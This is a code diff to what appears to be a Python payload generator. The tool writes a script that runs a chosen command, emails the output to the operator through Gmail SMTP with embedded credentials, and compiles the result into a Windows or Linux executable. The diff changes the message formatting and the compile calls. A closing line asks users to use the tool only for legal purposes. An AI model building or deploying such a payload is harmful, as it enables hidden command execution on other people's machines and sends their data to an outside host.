@@ -31,8 +31,8 @@ def create_payload(file_name, username, password, command):
 		file.write('server = smtplib.SMTP("smtp.gmail.com", 587)\n')
 		file.write('server.starttls()\n')
 		file.write('server.login(' + '"' + username + '"' +  ','  + '"' + password  + '"' +')\n')
-		file.write('message = " ** Command Reporter ** "\n')
-		file.write('message = ' + 'message' + "+" + '" Result of "' + '+' + 'command' +  '\n')
+		file.write('message = " ** Command Reporter ** \\n"\n')
+		file.write('message = ' + 'message' + "+" + '" Result of "' + '+' + 'command' +  "+" + ' " \\n"' + '\n')
 		file.write('server.sendmail(' + '"' + username + '"' +',' + '"' +  username	 + '"' +',' + 'message' + '+' + 'output' + ')' +  '\n' )
 		file.write('server.quit()')
 
@@ -42,10 +42,10 @@ def create_payload(file_name, username, password, command):
 create_payload(file_name, arguments.username, arguments.password, arguments.command)
 
 if arguments.windows:
-	compile_for_windows(arguments.out)
+	compile_for_windows(file_name)
 
 if arguments.linux:
-	compile_for_linux(arguments.out)
+	compile_for_linux(file_name)
 
 print("\n\n[***] Please use this tool for Legal and Valid Purposes\n")
 print("Thanks for using this tool :)")
